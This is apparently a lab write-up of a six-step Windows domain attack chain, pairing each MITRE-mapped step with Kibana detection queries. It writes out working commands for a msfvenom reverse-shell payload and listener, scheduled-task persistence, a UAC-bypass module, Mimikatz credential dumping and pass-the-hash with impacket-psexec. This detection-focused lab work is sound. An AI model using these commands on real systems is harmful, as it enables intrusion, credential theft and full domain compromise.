# Nation-State Lab – Complete Attack Chain Documentation (Phase 1–6)

---

# Phase 1: Reconnaissance – Network Discovery

## 1. Objective
Discover live hosts, open ports, and services in the network `192.168.1.0/24`.

**MITRE ATT&CK Mapping:**
- Tactic: TA0043 – Reconnaissance  
- Technique: T1595 – Active Scanning  

---

## 2. Attack Execution

```bash
nmap -sV -O 192.168.1.0/24
```

### Key Flags
- `-sV` → service version detection  
- `-O` → OS detection  

### Example Output
- Domain Controller: 192.168.1.10
- WS1: 192.168.1.20
- FILESERVER: 192.168.1.25
- WS2: 192.168.1.30

---

## 3. Detection (Kibana)

```text
message: "nmap"
```

Event stored in `filebeat-*`.

---

## 4. Conclusion
All hosts and services were successfully identified.

---

# Phase 2: Initial Access – Reverse Shell on WS1

## 1. Objective
Gain access to WS1 using a reverse shell.

**MITRE ATT&CK:**
- TA0001 – Initial Access  
- T1203 – Exploitation for Client Execution  

---

## 2. Attack Execution

### Payload Generation
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe
```

### Listener
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit -j
```

### Execution on WS1
```cmd
C:\Users\Public\shell.exe
```

---

## 3. Detection

- Event ID 4688 → Process creation
- Sysmon Event ID 1 → process execution
- Sysmon Event ID 3 → network connection

---

## 4. Kibana Query
```text
winlog.event_id: 4688 AND process.executable: *shell.exe
```

---

## 5. Conclusion
Meterpreter session established successfully.

---

# Phase 3: Persistence – Scheduled Task on WS1

## 1. Objective
Maintain persistence using scheduled task.

**MITRE ATT&CK:**
- TA0003 – Persistence  
- T1053.005 – Scheduled Task  

---

## 2. Attack Execution

```cmd
schtasks /create /tn "Updater" /tr "C:\Users\Public\shell.exe" /sc daily /st 09:00 /f
```

### Verify
```cmd
schtasks /query /tn "Updater"
```

---

## 3. Detection

- Event ID 4698 → Scheduled task creation

---

## 4. Kibana Query
```text
winlog.event_id: 4698 AND winlog.event_data.TaskName: Updater
```

---

## 5. Conclusion
Persistence successfully established.

---

# Phase 4: Privilege Escalation – UAC Bypass

## 1. Objective
Escalate privileges from user → SYSTEM.

**MITRE ATT&CK:**
- TA0004 – Privilege Escalation  
- T1548.002 – UAC Bypass  

---

## 2. Attack Execution

```text
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4445
run
```

### Result
```text
getuid
NT AUTHORITY\SYSTEM
```

---

## 3. Detection

- Event ID 4688 → eventvwr.exe / sdclt.exe
- Sysmon Event ID 1

---

## 4. Kibana Query
```text
winlog.event_id: 4688 AND process.executable: *eventvwr.exe
```

---

## 5. Conclusion
Privilege escalation achieved successfully.

---

# Phase 5: Credential Dumping – Mimikatz

## 1. Objective
Extract NTLM hashes from LSASS.

**MITRE ATT&CK:**
- TA0006 – Credential Access  
- T1003.001 – LSASS Dumping  

---

## 2. Attack Execution

```text
load kiwi
creds_all
```

### Extracted Hash
```
Administrator:
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## 3. Detection

- Event ID 4688 → mimikatz.exe
- Sysmon Event ID 10 → LSASS access
- Event ID 4663 → object access

---

## 4. Kibana Query
```text
event.code: 10 AND winlog.event_data.TargetImage: *lsass.exe
```

---

## 5. Conclusion
Credentials successfully dumped from LSASS.

---

# Phase 6: Lateral Movement – Pass-the-Hash

## 1. Objective
Move to Domain Controller using NTLM hash.

**MITRE ATT&CK:**
- TA0008 – Lateral Movement  
- T1550.002 – Pass-the-Hash  

---

## 2. Attack Execution

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
nation/administrator@192.168.1.10
```

---

## 3. Detection

- Event ID 4624 → Network logon
- Event ID 4672 → Admin privileges
- Event ID 7045 → Service creation

---

## 4. Kibana Query
```text
winlog.event_id: 4624 AND winlog.event_data.LogonType: 3
```

---

## 5. Conclusion
Full domain compromise achieved via pass-the-hash.

---

# END OF ATTACK CHAIN